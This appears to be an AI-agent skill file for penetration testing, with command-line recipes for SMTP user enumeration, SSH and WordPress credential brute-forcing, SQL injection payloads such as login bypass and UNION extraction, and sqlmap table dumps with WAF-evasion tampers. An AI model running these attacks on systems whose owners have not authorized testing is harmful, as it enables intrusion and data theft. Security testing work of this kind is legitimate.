---
name: pentest-toolkit
description: "Comprehensive penetration testing toolkit. Use when asked to pentest or audit security of SMTP, SSH, WordPress, SQL injection, or database enumeration. Covers SMTP relay testing, SSH brute-force, WordPress scanning (WPScan), SQLi manual testing, and automated SQLMap."
metadata:
  author: zebbern
---

# Pentest Toolkit

A consolidated reference for penetration testing common attack surfaces.

---

## 1. SMTP Penetration Testing

**Goal**: Identify open relays, user enumeration, weak auth, misconfiguration.

**Tools**: `nmap`, `smtp-user-enum`, `Hydra`, `Metasploit`

```bash
# Banner grab
nmap -sV -p 25,465,587 <target>

# User enumeration via VRFY
smtp-user-enum -M VRFY -U users.txt -t <target>

# Relay test
nmap -p 25 --script smtp-open-relay <target>
```

**Key checks**: Open relay, STARTTLS availability, AUTH mechanisms, VRFY/EXPN enabled.

---

## 2. SSH Penetration Testing

**Goal**: Enumerate configs, brute-force credentials, tunneling techniques.

**Tools**: `nmap`, `ssh-audit`, `Hydra`, `Medusa`

```bash
# Enumerate algorithms and config
ssh-audit <target>

# Brute-force credentials
hydra -l root -P wordlist.txt ssh://<target>

# Nmap SSH scripts
nmap -p 22 --script ssh-* <target>
```

**Key checks**: Protocol version (avoid SSH1), weak ciphers, PermitRootLogin, empty passwords.

---

## 3. WordPress Penetration Testing

**Goal**: Enumerate users/plugins/themes, scan for known vulns, credential attacks.

**Tools**: `WPScan`, `Metasploit`, `Burp Suite`

```bash
# Full scan with API token
wpscan --url https://target.com --api-token YOUR_TOKEN --enumerate vp,vt,u

# Brute-force login
wpscan --url https://target.com -U admin -P wordlist.txt

# Enumerate plugins aggressively
wpscan --url https://target.com --enumerate ap --plugins-detection aggressive
```

**Key checks**: Outdated core/plugins/themes, `xmlrpc.php` exposure, debug mode, file editing enabled.

---

## 4. SQL Injection Testing (Manual)

**Goal**: Identify and exploit SQLi flaws — in-band, blind, out-of-band.

**Tools**: `Burp Suite`, `sqlmap`, browser dev tools

```sql
-- Basic test
' OR '1'='1' --

-- Union-based extraction
' UNION SELECT null, table_name FROM information_schema.tables --

-- Boolean blind
' AND 1=1 -- (true)
' AND 1=2 -- (false)

-- Time-based blind
' AND SLEEP(5) --
```

**Key checks**: Error messages revealing DB type, login bypass, extractable table names, write access.

---

## 5. SQLMap (Automated SQL Injection)

**Goal**: Automate SQLi detection and database enumeration.

**Basic Usage:**
```bash
# Test a URL
sqlmap -u "https://target.com/page?id=1"

# Enumerate databases
sqlmap -u "https://target.com/page?id=1" --dbs

# Dump a specific table
sqlmap -u "https://target.com/page?id=1" -D dbname -T tablename --dump

# Use with Burp request file
sqlmap -r request.txt --level=5 --risk=3

# Bypass WAF
sqlmap -u "..." --tamper=space2comment,between
```

⚠️ **Legal Reminder**: Only run pentest tools against systems you own or have explicit written authorization to test.
